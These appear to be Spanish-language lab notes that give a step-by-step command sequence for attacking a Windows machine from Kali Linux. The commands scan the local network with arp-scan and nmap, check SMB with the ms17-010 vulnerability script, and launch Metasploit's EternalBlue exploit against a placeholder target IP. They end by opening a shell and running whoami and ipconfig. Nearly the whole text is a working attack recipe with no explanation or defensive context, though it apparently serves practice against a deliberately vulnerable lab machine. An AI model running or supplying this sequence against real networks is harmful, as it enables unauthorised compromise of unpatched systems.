antes de inicial kali linux
asegurate de colocar el adaptador de red a modo puente y elige el adaptador de red que este conectado a internet, luego enciende la maquina virtual

luego de encender kali linux, ejecuta los siguientes comandos:

clear
apt update -y && apt upgrade -y
sudo arp-scan -I [nombre-interfaz] --localnet
sudo nmap -sn [direccion-ip-de-red]/[prefijo-de-red]
sudo nmap -sCV -p -vvv 135,139,445 [direccion-ip-de-red]/[prefijo-de-red]
ping -c 1 [direccion-ip-maquina-vulnerable]
sudo nmap -p445 --script smb-vuln-ms17-010 [direccion-ip-maquina-vulnerable]
msfconsole
search eternalblue
use 0
show options
set RHOSTS [direccion-ip-maquina-vulnerable]
show options
exploit

shell

whoami

ipconfig
etc.
